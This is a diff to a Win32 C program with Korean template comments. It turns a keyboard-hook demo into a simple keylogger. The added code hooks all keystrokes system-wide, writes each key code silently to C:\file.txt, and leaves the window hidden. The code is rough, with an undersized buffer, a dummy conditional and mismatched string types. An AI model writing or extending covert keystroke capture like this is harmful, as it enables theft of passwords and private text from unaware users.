@@ -6,10 +6,19 @@
 
 #define MAX_LOADSTRING 100
 
+
+
 // 전역 변수:
 HINSTANCE hInst;								// 현재 인스턴스입니다.
 TCHAR szTitle[MAX_LOADSTRING];					// 제목 표시줄 텍스트입니다.
 TCHAR szWindowClass[MAX_LOADSTRING];			// 기본 창 클래스 이름입니다.
+
+//파일 처리
+
+
+DWORD dwWritten; // number of bytes written to file
+HANDLE hFile;  
+
 
 // 이 코드 모듈에 들어 있는 함수의 정방향 선언입니다.
 ATOM				MyRegisterClass(HINSTANCE hInstance);
@@ -23,11 +32,7 @@ HHOOK hHook;
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-   // printf("You pressed a key!\n"); 
-	
-
-	
-
+  
 	BOOL fEatKeystroke = FALSE;
 
     if (nCode == HC_ACTION)
@@ -38,21 +43,29 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         case WM_SYSKEYDOWN:
         case WM_KEYUP:
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
-       WCHAR szTest[10]; // WCHAR is the same as wchar_t
-			
+           
+		   
+		   char szTest[2];
+		  
+		
 		   if (p->vkCode)  //redirect a to b
 		{     
           
 
             if ( (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN) ) // Keydown
             {
-                // keybd_event('B', 0, 0, 0);
-	//				DWORD dw=3;
-				// swprintf_s is the same as sprintf_s for wide characters
-				swprintf_s(szTest, 10, L"%d", p->vkCode); // use L"" prefix for wide chars
-				//swprintf_s(szTest, 10, L"%d", p->scanCode); // use L"" prefix for wide chars
+               
+				sprintf_s(szTest, "%c", p->vkCode); // use L"" prefix for wide chars
 				
-				MessageBox(NULL, szTest, L"TEST", MB_OK);
+							
+				int scanCode = 65;
+				if ( scanCode > 64 )
+                                 {
+																			
+                                 WriteFile(hFile, szTest,sizeof(szTest),&dwWritten,NULL);
+							
+								 } 
+
 			  }
             else if ( (wParam == WM_KEYUP) || (wParam == WM_SYSKEYUP) ) // Keyup
             {
@@ -69,6 +82,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     }
     return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
 }
+
 
 
 
@@ -168,8 +182,15 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
     // Install the low-level keyboard & mouse hooks
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
 
-    // Keep this app running until we're told to stop
-   
+	hFile=CreateFile("C:\\file.txt",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
+if(hFile==INVALID_HANDLE_VALUE)
+  {
+    MessageBox(0,"Could not create/open a file","Error",16);
+    return 0;
+  }
+
+
+
 
   // ShowWindow(hWnd, nCmdShow);
   // UpdateWindow(hWnd);
